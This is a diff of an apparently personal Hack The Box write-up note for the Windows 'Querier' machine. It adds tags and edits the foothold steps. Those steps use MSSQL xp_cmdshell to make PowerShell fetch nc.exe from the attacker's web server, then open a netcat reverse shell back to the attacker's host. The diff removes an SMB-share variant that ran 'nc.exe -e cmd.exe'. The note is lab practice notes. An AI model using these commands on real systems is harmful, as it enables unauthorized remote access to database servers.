@@ -1,11 +1,22 @@
 ---
 date: 2024-10-14
 title: Querier HTB Write-Up
-machine_ip: 
+machine_ip: 10.10.10.125
 os: Windows
 difficulty: Medium
-my_rating: 
-tags: 
+my_rating: 2
+tags:
+  - Windows
+  - PrivEsc
+  - SMB
+  - SQL
+  - MSSQL
+  - nc
+  - rustscan
+  - olevba
+  - nmap
+  - smbclient
+  - mssqlclient
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -544,17 +555,14 @@ NULL
 
 - ==resume here==
 - using the `xp_cmdshell` let's get a real shell by transferring `nc` over to RHOST so we can catch a shell
+	- Make sure to `enable_xp_cmdshell` to allow cmds
 	- `python -m SimpleHTTPServer 80`
 	- `xp_cmdshell "powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\nc.exe http://10.10.14.5/nc.exe"`
 	- `nc -lnvp 443`
 ```
-
+xp_cmdshell "C:\Users\mssql-svc\nc.exe 10.10.14.5 443"
 ```
-- start smb server to use `nc`
-	- `smbserver.py -smb2support a smb/`
-- `xp_cmdshell \\10.10.14.5\a\nc.exe -e cmd.exe 10.10.14.5 443`
-- #rlwrap ? with `nc`?
-	- ==resume here==
+- ==resume here==
 
 # PrivEsc
 [[Privilege Escalation]], [[1_Initial_Enumeration]]
